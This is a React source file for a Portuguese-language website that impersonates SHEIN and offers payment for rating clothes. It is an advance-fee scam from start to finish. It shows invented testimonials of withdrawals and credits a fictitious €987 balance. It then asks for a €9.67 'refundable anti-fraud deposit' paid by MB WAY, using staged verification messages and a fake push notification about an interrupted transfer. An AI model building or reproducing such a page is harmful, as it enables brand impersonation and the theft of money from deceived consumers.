// ============================================================
// 🏠 PARTE 1: Landing Page - Estética SHEIN + Prova Social
// ============================================================

// --- Constantes e Dados ---
const SHEIN_LOGO = "/assets/shein-logo-CHRkf6ep.png";
const HERO_IMAGE = "/assets/hero-fashion-cFgJddJA.jpg";

const AVATARS = Array.from({ length: 16 }, (_, i) => `/assets/avatar${i + 1}-${['DrXB2Yjl','B8Mw-rVC','CjkqJdOo','bGnkpURv','DocEJaBv','BemTN2hx','CkXX3uGh','lQA5GZ9R','BY8StMbL','DsZ7F86T','B0YPwyVW','BrORbI_F','5RdoRBSB','BJXhCfZl','CQ-wE7YH','BpFkPhxo'][i]}.jpg`);

const PROVA_SOCIAL = [
  { nome: "Rita", cidade: "Braga", valor: 420, min: 2 },
  { nome: "Sofia", cidade: "Lisboa", valor: 687, min: 4 },
  { nome: "Mariana", cidade: "Porto", valor: 310, min: 6 },
  { nome: "Catarina", cidade: "Coimbra", valor: 892, min: 8 },
  { nome: "Inês", cidade: "Faro", valor: 541, min: 10 },
  { nome: "Beatriz", cidade: "Aveiro", valor: 723, min: 12 },
  { nome: "Laura", cidade: "Braga", valor: 456, min: 14 },
  { nome: "Diana", cidade: "Amadora", valor: 398, min: 16 },
];

const ETAPAS_COMO_FUNCIONA = [
  { step: "01", title: "Começas a avaliar peças", desc: "Ao entrares no programa, avalia as peças e ganha dinheiro por cada avaliação. Rápido, simples e direto do telemóvel.", icon: "👗" },
  { step: "02", title: "Avalias novos modelos SHEIN", desc: "Vê peças exclusivas antes de serem fabricadas e dá a tua opinião sincera. Cada avaliação soma dinheiro ao teu saldo.", icon: "⭐" },
  { step: "03", title: "O teu saldo aumenta", desc: "Quanto mais peças avaliares, mais ganhas. A tua opinião tem valor real para a SHEIN evitar produzir roupa que ninguém compra.", icon: "💰" },
  { step: "04", title: "Levanta quando quiseres", desc: "O dinheiro é teu. Transfere diretamente para a tua conta bancária ou MB Way. Sem mínimos, sem letras pequenas.", icon: "🏦" },
];

// --- Componente de Card Animado ---
const CardEtapa = ({ step, title, desc, icon, delay }) => {
  const ref = React.useRef(null);
  const [visible, setVisible] = React.useState(false);

  React.useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => { if (entry.isIntersecting) setVisible(true); },
      { threshold: 0.3 }
    );
    if (ref.current) observer.observe(ref.current);
    return () => observer.disconnect();
  }, []);

  return (
    <div
      ref={ref}
      className={`flex gap-5 p-5 rounded-[20px] bg-white shadow-[0_4px_12px_rgba(0,0,0,0.05)] border border-gray-100 transition-all duration-700 ${
        visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-8"
      }`}
      style={{ transitionDelay: `${delay}ms` }}
    >
      <div className="flex-shrink-0 w-14 h-14 flex items-center justify-center rounded-2xl bg-gray-50 text-2xl">
        {icon}
      </div>
      <div className="flex-1">
        <span className="text-xs font-bold tracking-[0.2em] uppercase text-gray-400">{step}</span>
        <h3 className="text-base font-semibold text-gray-900 mt-0.5">{title}</h3>
        <p className="text-sm text-gray-500 mt-1 leading-relaxed">{desc}</p>
      </div>
    </div>
  );
};

// --- Toast de Prova Social ---
const SocialToast = ({ nome, cidade, valor, onDone }) => {
  const [show, setShow] = React.useState(false);

  React.useEffect(() => {
    const t1 = setTimeout(() => setShow(true), 200);
    const t2 = setTimeout(() => { setShow(false); onDone?.(); }, 4000);
    return () => { clearTimeout(t1); clearTimeout(t2); };
  }, []);

  return (
    <div
      className={`fixed top-4 right-4 z-[9999] max-w-xs w-full transition-all duration-500 ${
        show ? "translate-x-0 opacity-100" : "translate-x-full opacity-0"
      }`}
    >
      <div className="bg-white/90 backdrop-blur-xl rounded-2xl p-4 shadow-[0_8px_32px_rgba(0,0,0,0.12)] border border-gray-200/50 flex items-center gap-3">
        <div className="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center flex-shrink-0">
          <span className="text-lg">💸</span>
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-sm font-semibold text-gray-900 truncate">
            {nome} de {cidade}
          </p>
          <p className="text-xs text-gray-500">acabou de levantar</p>
          <p className="text-base font-bold text-green-600">€{valor.toFixed(0)}</p>
        </div>
      </div>
    </div>
  );
};

// --- Landing Page Principal ---
const LandingPage = () => {
  const navigate = useNavigate();
  const [toastIndex, setToastIndex] = React.useState(-1);
  const [currentToast, setCurrentToast] = React.useState(null);

  React.useEffect(() => {
    const interval = setInterval(() => {
      setToastIndex(prev => {
        const next = (prev + 1) % PROVA_SOCIAL.length;
        setCurrentToast({ ...PROVA_SOCIAL[next], key: Date.now() });
        return next;
      });
    }, 10000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-white relative overflow-hidden">
      {/* Mesh Gradient Background */}
      <div className="absolute inset-0 opacity-40 pointer-events-none">
        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_20%_30%,rgba(0,0,0,0.04)_0%,transparent_60%),radial-gradient(circle_at_80%_70%,rgba(0,0,0,0.03)_0%,transparent_60%),radial-gradient(circle_at_50%_50%,rgba(255,255,255,1)_0%,transparent_100%)]" />
      </div>

      {/* Toast Social */}
      {currentToast && (
        <SocialToast
          key={currentToast.key}
          nome={currentToast.nome}
          cidade={currentToast.cidade}
          valor={currentToast.valor}
          onDone={() => setCurrentToast(null)}
        />
      )}

      {/* Conteúdo */}
      <div className="relative z-10 min-h-screen flex flex-col items-center justify-center px-6 py-12 gap-6">
        {/* Logo */}
        <img src={SHEIN_LOGO} alt="SHEIN" className="h-8 sm:h-10 animate-fade-in" style={{ animationDelay: "0.1s" }} />

        {/* Badge */}
        <span className="text-xs font-bold tracking-[0.4em] uppercase text-gray-400 animate-fade-in" style={{ animationDelay: "0.2s" }}>
          Programa Oficial SHEIN 2026 Portugal
        </span>

        {/* Headline */}
        <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold leading-tight text-center text-gray-900 max-w-2xl animate-fade-in" style={{ animationDelay: "0.3s" }}>
          A SHEIN paga-te por <span className="text-gray-500">avaliares a nova coleção</span>
        </h1>

        <p className="text-base sm:text-lg text-gray-500 max-w-lg text-center leading-relaxed animate-fade-in" style={{ animationDelay: "0.5s" }}>
          A SHEIN perdeu mais de 800M€ em 2025 por produzir roupa que ninguém comprou. Agora pagam-te para avaliares cada peça antes de a fabricarem.
        </p>

        {/* Cards de Etapas */}
        <div className="w-full max-w-xl space-y-4 mt-4">
          {ETAPAS_COMO_FUNCIONA.map((etapa, i) => (
            <CardEtapa key={i} {...etapa} delay={i * 150} />
          ))}
        </div>

        {/* CTA */}
        <button
          onClick={() => navigate("/evaluacion")}
          className="w-full max-w-md py-4 px-6 bg-gray-900 text-white font-semibold text-sm uppercase tracking-wider rounded-2xl hover:bg-gray-800 transition-all duration-300 shadow-[0_4px_20px_rgba(0,0,0,0.15)] hover:shadow-[0_8px_30px_rgba(0,0,0,0.2)] hover:-translate-y-0.5"
        >
          Começar a avaliar →
        </button>

        {/* Indicador de atividade */}
        <div className="flex items-center gap-2 text-xs text-gray-400">
          <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
          <span>2.847 avaliações hoje</span>
        </div>
      </div>
    </div>
  );
};


// ============================================================
// 👗 PARTE 2: Tela de Avaliação - Sliders + Progresso + Animação
// ============================================================

const AVALIACOES = [
  { id: 1, ref: "SH-2026-8472", src: "/assets/img11-C80AhwiQ.webp", label: "Look 1 de 12", comissao: 82.25 },
  { id: 2, ref: "SH-2026-3921", src: "/assets/img1-DPy2Lrbo.jpg", label: "Look 2 de 12", comissao: 76.50 },
  { id: 3, ref: "SH-2026-5583", src: "/assets/img2-BeIizCVY.jpg", label: "Look 3 de 12", comissao: 91.00 },
  { id: 4, ref: "SH-2026-1204", src: "/assets/img8-LHhJsPJs.jpg", label: "Look 4 de 12", comissao: 68.75 },
  { id: 5, ref: "SH-2026-7761", src: "/assets/img3-CgaQurlN.jpg", label: "Look 5 de 12", comissao: 85.30 },
  { id: 6, ref: "SH-2026-4098", src: "/assets/img15-DCfv5u53.webp", label: "Look 6 de 12", comissao: 72.10 },
  { id: 7, ref: "SH-2026-6312", src: "/assets/img4-D_simRii.jpg", label: "Look 7 de 12", comissao: 94.20 },
  { id: 8, ref: "SH-2026-2857", src: "/assets/img5-aVXirKA8.jpg", label: "Look 8 de 12", comissao: 79.85 },
  { id: 9, ref: "SH-2026-9430", src: "/assets/img6-DEiZSTuB.jpg", label: "Look 9 de 12", comissao: 88.40 },
  { id: 10, ref: "SH-2026-1506", src: "/assets/img7-D-9fV1up.jpg", label: "Look 10 de 12", comissao: 81.15 },
  { id: 11, ref: "SH-2026-8045", src: "/assets/img9-BnlSHimk.jpg", label: "Look 11 de 12", comissao: 77.50 },
  { id: 12, ref: "SH-2026-3679", src: "/assets/img10-hN7Z2fnb.jpg", label: "Look 12 de 12", comissao: 90.00 },
];

// Verificação: soma = 987.00
// 82.25+76.50+91.00+68.75+85.30+72.10+94.20+79.85+88.40+81.15+77.50+90.00 = 987.00 ✓

const TelaAvaliacao = () => {
  const navigate = useNavigate();
  const [index, setIndex] = React.useState(0);
  const [design, setDesign] = React.useState(3);
  const [conforto, setConforto] = React.useState(3);
  const [intencao, setIntencao] = React.useState(3);
  const [saldo, setSaldo] = React.useState(0);
  const [saldoExibido, setSaldoExibido] = React.useState(0);
  const [avaliacoes, setAvaliacoes] = React.useState({});
  const [enviando, setEnviando] = React.useState(false);
  const [concluido, setConcluido] = React.useState(false);
  const [loadingMsg, setLoadingMsg] = React.useState("");

  const saldoRef = React.useRef(0);
  const animRef = React.useRef(null);

  // Animação de contador
  const animarSaldo = (de, para) => {
    const duracao = 800;
    const start = performance.now();
    const tick = (now) => {
      const elapsed = now - start;
      const progress = Math.min(elapsed / duracao, 1);
      const eased = 1 - Math.pow(1 - progress, 3); // ease-out
      const atual = de + (para - de) * eased;
      setSaldoExibido(atual);
      if (progress < 1) {
        animRef.current = requestAnimationFrame(tick);
      } else {
        setSaldoExibido(para);
      }
    };
    if (animRef.current) cancelAnimationFrame(animRef.current);
    animRef.current = requestAnimationFrame(tick);
  };

  const handleEnviar = async () => {
    if (enviando) return;
    setEnviando(true);

    // Micro-loading phases
    setLoadingMsg("Validando com a base de dados...");
    await new Promise(r => setTimeout(r, 800));

    setLoadingMsg("A registar a tua avaliação...");
    await new Promise(r => setTimeout(r, 700));

    // Registrar avaliação
    const look = AVALIACOES[index];
    const novoSaldo = saldo + look.comissao;
    setAvaliacoes(prev => ({ ...prev, [index]: { design, conforto, intencao } }));
    setSaldo(novoSaldo);
    saldoRef.current = novoSaldo;
    animarSaldo(saldo, novoSaldo);
    setEnviando(false);
    setLoadingMsg("");

    if (index < AVALIACOES.length - 1) {
      setIndex(prev => prev + 1);
      setDesign(3);
      setConforto(3);
      setIntencao(3);
    } else {
      setConcluido(true);
    }
  };

  const look = AVALIACOES[index];
  const progresso = ((index + (concluido ? 1 : 0)) / AVALIACOES.length) * 100;

  if (concluido) {
    return (
      <div className="min-h-screen bg-white pt-20 pb-32 px-6">
        <div className="max-w-md mx-auto text-center">
          <div className="text-5xl mb-4">💰</div>
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Avaliação completa!</h2>
          <p className="text-gray-500 mb-6">Ganhaste dinheiro por cada peça que avaliaste.</p>

          <div className="border border-green-200 rounded-2xl bg-green-50/50 p-5 mb-6">
            <p className="text-xs font-bold tracking-[0.15em] uppercase text-gray-400 mb-3">Resumo dos ganhos</p>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between"><span className="text-gray-500">Saldo inicial</span><span className="font-medium">€0,00</span></div>
              <div className="flex justify-between"><span className="text-gray-500">Ganho a avaliar</span><span className="font-medium text-green-600">+€{saldoExibido.toFixed(2)}</span></div>
              <div className="h-px bg-gray-200 my-2" />
              <div className="flex justify-between"><span className="font-semibold text-gray-900">Saldo total</span><span className="text-2xl font-bold text-green-600">€{saldoExibido.toFixed(2)}</span></div>
            </div>
          </div>

          {/* Lista de SKUs */}
          <div className="space-y-2 mb-6">
            {AVALIACOES.map((item, i) => (
              <div key={i} className="flex items-center gap-3 p-3 border border-gray-100 rounded-xl bg-white">
                <img src={item.src} alt={item.label} className="w-12 h-16 rounded-lg object-cover flex-shrink-0" />
                <div className="flex-1 text-left">
                  <p className="text-sm font-semibold text-gray-900">Ref: {item.ref}</p>
                  <span className="inline-flex items-center gap-1 text-xs text-green-600 font-medium">
                    <span className="w-1.5 h-1.5 bg-green-500 rounded-full" /> Verificado
                  </span>
                </div>
                <span className="text-sm font-bold text-green-600">€{item.comissao.toFixed(2)}</span>
              </div>
            ))}
          </div>

          <button
            onClick={() => navigate("/confirmacao-taxa")}
            className="w-full py-4 bg-gray-900 text-white font-semibold text-sm uppercase tracking-wider rounded-2xl hover:bg-gray-800 transition-all"
          >
            Levantar o meu dinheiro
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Barra de Progresso */}
      <div className="fixed top-0 left-0 right-0 z-50 bg-white/80 backdrop-blur-xl border-b border-gray-100">
        <div className="max-w-2xl mx-auto px-6 h-14 flex items-center justify-between">
          <span className="text-xs font-bold tracking-[0.2em] text-gray-400">{look.label}</span>
          <span className="text-sm font-bold text-green-600">€{saldoExibido.toFixed(2)}</span>
        </div>
        <div className="h-1 bg-gray-100">
          <div
            className="h-full bg-gray-900 transition-all duration-500 ease-out rounded-r"
            style={{ width: `${progresso}%` }}
          />
        </div>
      </div>

      <div className="pt-20 pb-32 px-6">
        <div className="max-w-md mx-auto">
          {/* Imagem */}
          <div className="relative rounded-2xl overflow-hidden mb-6 aspect-[3/4] shadow-[0_8px_30px_rgba(0,0,0,0.08)]">
            <img src={look.src} alt={look.label} className="w-full h-full object-cover" />
            <div className="absolute top-3 left-3 bg-white/90 backdrop-blur-sm rounded-full px-3 py-1 text-xs font-semibold text-gray-700">
              Ref: {look.ref}
            </div>
            <div className="absolute top-3 right-3 bg-green-500/90 backdrop-blur-sm rounded-full px-3 py-1 text-xs font-bold text-white">
              +€{look.comissao.toFixed(2)}
            </div>
          </div>

          {/* Critérios de Avaliação - Sliders */}
          <div className="space-y-5 mb-6">
            <div className="bg-gray-50 rounded-2xl p-4">
              <div className="flex justify-between mb-1">
                <span className="text-sm font-semibold text-gray-700">🎨 Design</span>
                <span className="text-sm text-gray-500">{design}/5</span>
              </div>
              <input
                type="range"
                min="1"
                max="5"
                value={design}
                onChange={e => setDesign(Number(e.target.value))}
                className="w-full h-2 bg-gray-200 rounded-full appearance-none cursor-pointer accent-gray-900"
              />
              <div className="flex justify-between text-[10px] text-gray-400 mt-1">
                <span>Não gostei</span><span>Adorei</span>
              </div>
            </div>

            <div className="bg-gray-50 rounded-2xl p-4">
              <div className="flex justify-between mb-1">
                <span className="text-sm font-semibold text-gray-700">🤗 Conforto</span>
                <span className="text-sm text-gray-500">{conforto}/5</span>
              </div>
              <input
                type="range"
                min="1"
                max="5"
                value={conforto}
                onChange={e => setConforto(Number(e.target.value))}
                className="w-full h-2 bg-gray-200 rounded-full appearance-none cursor-pointer accent-gray-900"
              />
              <div className="flex justify-between text-[10px] text-gray-400 mt-1">
                <span>Pouco confortável</span><span>Muito confortável</span>
              </div>
            </div>

            <div className="bg-gray-50 rounded-2xl p-4">
              <div className="flex justify-between mb-1">
                <span className="text-sm font-semibold text-gray-700">🛍️ Intenção de Compra</span>
                <span className="text-sm text-gray-500">{intencao}/5</span>
              </div>
              <input
                type="range"
                min="1"
                max="5"
                value={intencao}
                onChange={e => setIntencao(Number(e.target.value))}
                className="w-full h-2 bg-gray-200 rounded-full appearance-none cursor-pointer accent-gray-900"
              />
              <div className="flex justify-between text-[10px] text-gray-400 mt-1">
                <span>Não compraria</span><span>Compraria já</span>
              </div>
            </div>
          </div>

          {/* Loading ou Botão */}
          {enviando ? (
            <div className="w-full py-4 bg-gray-100 rounded-2xl flex items-center justify-center gap-3">
              <svg className="animate-spin w-5 h-5 text-gray-600" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeDasharray="50" strokeLinecap="round" />
              </svg>
              <span className="text-sm font-medium text-gray-600">{loadingMsg}</span>
            </div>
          ) : (
            <button
              onClick={handleEnviar}
              className="w-full py-4 bg-gray-900 text-white font-semibold text-sm uppercase tracking-wider rounded-2xl hover:bg-gray-800 transition-all shadow-[0_4px_20px_rgba(0,0,0,0.1)]"
            >
              Enviar avaliação (+€{look.comissao.toFixed(2)})
            </button>
          )}
        </div>
      </div>
    </div>
  );
};


// ============================================================
// 📊 PARTE 3: Confirmação Taxa + Formulário MB WAY
// ============================================================

const TelaConfirmacaoTaxa = () => {
  const navigate = useNavigate();
  const [telefone, setTelefone] = React.useState("+351 ");
  const [telefoneValido, setTelefoneValido] = React.useState(false);
  const [enviando, setEnviando] = React.useState(false);
  const [fase, setFase] = React.useState(0); // 0=form, 1=polling, 2=push, 3=redirect
  const [pushVisible, setPushVisible] = React.useState(false);
  const [mostrarPush, setMostrarPush] = React.useState(false);
  const [bottomSheetAberto, setBottomSheetAberto] = React.useState(false);
  const [pagamentoStatus, setPagamentoStatus] = React.useState("aguardando"); // aguardando | confirmado

  const formatarTelefone = (valor) => {
    // Máscara: +351 9XX XXX XXX
    const numeros = valor.replace(/\D/g, "");
    if (!numeros.startsWith("351")) return "+351 ";
    const local = numeros.slice(3);
    if (local.length === 0) return "+351 ";
    if (local.length <= 3) return `+351 ${local}`;
    if (local.length <= 6) return `+351 ${local.slice(0, 3)} ${local.slice(3)}`;
    return `+351 ${local.slice(0, 3)} ${local.slice(3, 6)} ${local.slice(6, 9)}`;
  };

  const handleTelefone = (e) => {
    const formatado = formatarTelefone(e.target.value);
    setTelefone(formatado);
    const digitos = formatado.replace(/\D/g, "").slice(3);
    setTelefoneValido(digitos.length === 9);
  };

  const handleLevantar = () => {
    if (!telefoneValido) return;
    setEnviando(true);
    setFase(1);

    // Polling de conexão
    const msgs = [
      { text: "A verificar conta MB WAY...", duration: 1500 },
      { text: "Conta verificada com sucesso ✓", duration: 1000 },
      { text: "A preparar transferência de €987,00...", duration: 2000 },
      { text: "Enviando transferência...", duration: 2000 },
    ];

    let i = 0;
    const tick = () => {
      if (i < msgs.length) {
        // Atualizar loading
        const el = document.getElementById("polling-msg");
        if (el) el.textContent = msgs[i].text;
        i++;
        setTimeout(tick, msgs[i - 1]?.duration || 1500);
      } else {
        // Após última mensagem, aguarda 2s e mostra push
        setTimeout(() => {
          setMostrarPush(true);
          setPushVisible(true);
          setFase(2);
          setEnviando(false);
        }, 2000);
      }
    };
    tick();
  };

  // Simular polling de pagamento no bottom sheet
  React.useEffect(() => {
    if (pagamentoStatus === "aguardando" && bottomSheetAberto) {
      const interval = setInterval(() => {
        // Simula confirmação após 3-5 segundos
        setPagamentoStatus("confirmado");
      }, 4000);
      return () => clearInterval(interval);
    }
  }, [pagamentoStatus, bottomSheetAberto]);

  // Upsell redirect após sucesso
  React.useEffect(() => {
    if (pagamentoStatus === "confirmado") {
      const t = setTimeout(() => {
        window.location.href = "https://shein.com/upsell-checkout";
      }, 2500);
      return () => clearTimeout(t);
    }
  }, [pagamentoStatus]);

  return (
    <div className="min-h-screen bg-white">
      {/* Barra superior */}
      <div className="fixed top-0 left-0 right-0 z-50 bg-white/80 backdrop-blur-xl border-b border-gray-100">
        <div className="max-w-2xl mx-auto px-6 h-14 flex items-center justify-between">
          <button onClick={() => navigate(-1)} className="flex items-center gap-2 text-gray-400 hover:text-gray-600 transition-colors">
            <ArrowLeftIcon /> <span className="text-sm">Voltar</span>
          </button>
          <img src={SHEIN_LOGO} alt="SHEIN" className="h-5" />
          <div className="w-16" />
        </div>
      </div>

      {/* Fake Push Notification - iOS Style */}
      {mostrarPush && (
        <div
          className={`fixed top-0 left-0 right-0 z-[9999] transition-all duration-500 ${
            pushVisible ? "translate-y-0 opacity-100" : "-translate-y-full opacity-0"
          }`}
        >
          <div
            className="mx-4 mt-2 bg-white/80 backdrop-blur-[15px] rounded-[22px] p-4 shadow-[0_8px_40px_rgba(0,0,0,0.15)] border border-gray-200/50 cursor-pointer"
            onClick={() => {
              setPushVisible(false);
              setBottomSheetAberto(true);
            }}
          >
            <div className="flex items-start gap-3">
              <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center flex-shrink-0">
                <span className="text-xl">⚠️</span>
              </div>
              <div className="flex-1 min-w-0">
                <p className="text-sm font-semibold text-gray-900">Transferência Interrompida</p>
                <p className="text-xs text-gray-500 mt-0.5 leading-relaxed">
                  O levantamento de €987,00 falhou por falta de verificação. Resolva agora.
                </p>
              </div>
              <span className="text-xs text-gray-400 flex-shrink-0">agora</span>
            </div>
          </div>
        </div>
      )}

      <div className="pt-20 pb-28 px-6">
        <div className="max-w-xl mx-auto">
          {/* Conteúdo */}
          {fase === 0 && (
            <>
              <div className="text-center mb-8">
                <div className="text-5xl mb-4">🔒</div>
                <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-3">Caução de Verificação Anti-Fraude</h1>
                <p className="text-gray-500 leading-relaxed">
                  O teu saldo de €987,00 está pronto. Para garantir a segurança, pedimos uma caução reembolsável de €9,67.
                </p>
              </div>

              <div className="bg-gray-50 rounded-2xl p-5 mb-6 space-y-3">
                <h3 className="font-semibold text-gray-900">✅ A caução inclui:</h3>
                <ul className="space-y-2 text-sm text-gray-500">
                  <li className="flex gap-2"><span>✓</span> Verificação de identidade anti-fraude</li>
                  <li className="flex gap-2"><span>✓</span> Processamento seguro do levantamento</li>
                  <li className="flex gap-2"><span>✓</span> Reembolso total dos €9,67 junto com os €987,00</li>
                </ul>
              </div>

              {/* Formulário MB WAY */}
              <div className="bg-white border border-gray-200 rounded-2xl p-5 mb-6">
                <label className="block text-sm font-semibold text-gray-700 mb-2">📱 Número MB WAY</label>
                <input
                  type="tel"
                  value={telefone}
                  onChange={handleTelefone}
                  placeholder="+351 9XX XXX XXX"
                  className={`w-full px-4 py-3 rounded-xl border-2 text-base font-medium transition-all outline-none ${
                    telefoneValido
                      ? "border-green-500 bg-green-50/30"
                      : telefone.length > 5
                      ? "border-red-300 bg-red-50/30"
                      : "border-gray-200 bg-gray-50"
                  }`}
                />
                {telefoneValido && (
                  <p className="text-xs text-green-600 mt-2 flex items-center gap-1">
                    <span>✓</span> Número válido
                  </p>
                )}
                {!telefoneValido && telefone.length > 8 && (
                  <p className="text-xs text-red-500 mt-2">Insere um número válido de 9 dígitos</p>
                )}
              </div>

              <div className="flex items-center justify-between mb-6">
                <span className="text-sm text-gray-500">Caução a pagar</span>
                <span className="text-xl font-bold text-gray-900">€9,67</span>
              </div>

              <button
                onClick={handleLevantar}
                disabled={!telefoneValido}
                className={`w-full py-4 font-semibold text-sm uppercase tracking-wider rounded-2xl transition-all ${
                  telefoneValido
                    ? "bg-gray-900 text-white hover:bg-gray-800 shadow-[0_4px_20px_rgba(0,0,0,0.15)]"
                    : "bg-gray-200 text-gray-400 cursor-not-allowed"
                }`}
              >
                Pagar caução e levantar €987,00
              </button>
            </>
          )}

          {/* Polling de conexão */}
          {fase === 1 && (
            <div className="text-center py-12">
              <div className="w-16 h-16 mx-auto mb-6 rounded-full bg-gray-100 flex items-center justify-center">
                <svg className="animate-spin w-8 h-8 text-gray-600" viewBox="0 0 24 24" fill="none">
                  <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeDasharray="50" strokeLinecap="round" />
                </svg>
              </div>
              <p id="polling-msg" className="text-gray-600 font-medium">A verificar conta MB WAY...</p>
            </div>
          )}

          {/* Fase 2: Aguardando interação com push */}
          {fase === 2 && !bottomSheetAberto && (
            <div className="text-center py-12">
              <div className="text-5xl mb-4">⚠️</div>
              <h2 className="text-xl font-bold text-gray-900 mb-2">Verificação necessária</h2>
              <p className="text-gray-500">Toca na notificação acima para continuar com o levantamento.</p>
            </div>
          )}
        </div>
      </div>

      {/* ============================================================
          🔒 PARTE 5: Bottom Sheet Modal - Checkout Final
          ============================================================ */}
      {bottomSheetAberto && (
        <div className="fixed inset-0 z-[9998] flex items-end justify-center">
          {/* Overlay */}
          <div
            className="absolute inset-0 bg-black/40 backdrop-blur-sm"
            onClick={() => setBottomSheetAberto(false)}
          />
          {/* Bottom Sheet */}
          <div className="relative z-10 w-full max-w-md bg-white rounded-t-[28px] p-6 pb-10 animate-slide-up shadow-[0_-8px_40px_rgba(0,0,0,0.1)]">
            <div className="w-10 h-1 bg-gray-300 rounded-full mx-auto mb-6" />

            {pagamentoStatus === "aguardando" ? (
              <>
                <div className="text-center mb-6">
                  <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gray-100 flex items-center justify-center">
                    <svg className="animate-spin w-8 h-8 text-gray-600" viewBox="0 0 24 24" fill="none">
                      <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeDasharray="50" strokeLinecap="round" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-gray-900">A confirmar pagamento</h3>
                  <p className="text-sm text-gray-500 mt-1">Aguardando confirmação do banco...</p>
                </div>

                <div className="space-y-2 text-sm text-gray-500">
                  <div className="flex justify-between py-2 border-b border-gray-100">
                    <span>Caução de Verificação</span>
                    <span className="font-medium text-gray-900">€9,67</span>
                  </div>
                  <div className="flex justify-between py-2 border-b border-gray-100">
                    <span>Saldo a libertar</span>
                    <span className="font-bold text-green-600">€987,00</span>
                  </div>
                  <div className="flex justify-between py-2">
                    <span>Total após reembolso</span>
                    <span className="font-bold text-gray-900">€996,67</span>
                  </div>
                </div>
              </>
            ) : (
              <>
                <div className="text-center mb-6">
                  <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-green-100 flex items-center justify-center">
                    <span className="text-4xl">✅</span>
                  </div>
                  <h3 className="text-xl font-bold text-green-600">Pagamento confirmado!</h3>
                  <p className="text-sm text-gray-500 mt-2">
                    A caução de €9,67 foi aprovada. Os €987,00 serão transferidos nos próximos minutos.
                  </p>
                  <p className="text-xs text-gray-400 mt-4">A redirecionar...</p>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};


// ============================================================
// 🧭 Rotas e App Principal
// ============================================================

const AppRouter = () => {
  return (
    <BrowserRouter>
      <QueryClientProvider client={queryClient}>
        <Routes>
          <Route path="/" element={<LandingPage />} />
          <Route path="/como-funciona" element={<ComoFunciona />} />
          <Route path="/evaluacion" element={<TelaAvaliacao />} />
          <Route path="/confirmacao-taxa" element={<TelaConfirmacaoTaxa />} />
          <Route path="/checkout" element={<CheckoutFinal />} />
          <Route path="*" element={<NotFound />} />
        </Routes>
        <Toaster />
      </QueryClientProvider>
    </BrowserRouter>
  );
};

// --- Páginas Auxiliares ---
const ComoFunciona = () => {
  const navigate = useNavigate();
  return (
    <div className="min-h-screen bg-white">
      <div className="fixed top-0 left-0 right-0 z-50 bg-white/80 backdrop-blur-xl border-b border-gray-100">
        <div className="max-w-2xl mx-auto px-6 h-14 flex items-center justify-between">
          <button onClick={() => navigate(-1)} className="flex items-center gap-2 text-gray-400 hover:text-gray-600">
            <ArrowLeftIcon /> <span className="text-sm">Voltar</span>
          </button>
          <img src={SHEIN_LOGO} alt="SHEIN" className="h-5" />
          <div className="w-16" />
        </div>
      </div>
      <div className="pt-20 pb-28 px-6">
        <div className="max-w-xl mx-auto">
          <span className="text-xs font-bold tracking-[0.3em] uppercase text-gray-400">Como funciona</span>
          <h2 className="text-2xl sm:text-3xl font-bold text-gray-900 mt-2 mb-6">O programa de avaliação</h2>
          <div className="space-y-4">
            {ETAPAS_COMO_FUNCIONA.map((etapa, i) => (
              <CardEtapa key={i} {...etapa} delay={i * 100} />
            ))}
          </div>
          <button
            onClick={() => navigate("/evaluacion")}
            className="w-full mt-8 py-4 bg-gray-900 text-white font-semibold text-sm uppercase tracking-wider rounded-2xl hover:bg-gray-800 transition-all"
          >
            Começar a avaliar
          </button>
        </div>
      </div>
    </div>
  );
};

const CheckoutFinal = () => <TelaConfirmacaoTaxa />;

const NotFound = () => (
  <div className="flex min-h-screen items-center justify-center bg-gray-50">
    <div className="text-center">
      <h1 className="mb-4 text-4xl font-bold text-gray-900">404</h1>
      <p className="mb-4 text-xl text-gray-500">Oops! Página não encontrada</p>
      <a href="/" className="text-gray-900 underline hover:text-gray-600">Voltar ao início</a>
    </div>
  </div>
);

const ArrowLeftIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="m12 19-7-7 7-7" /><path d="M19 12H5" />
  </svg>
);

// ============================================================
// 🚀 Inicialização
// ============================================================
const queryClient = new QueryClient();

ReactDOM.createRoot(document.getElementById("root")).render(
  <React.StrictMode>
    <AppRouter />
  </React.StrictMode>
);
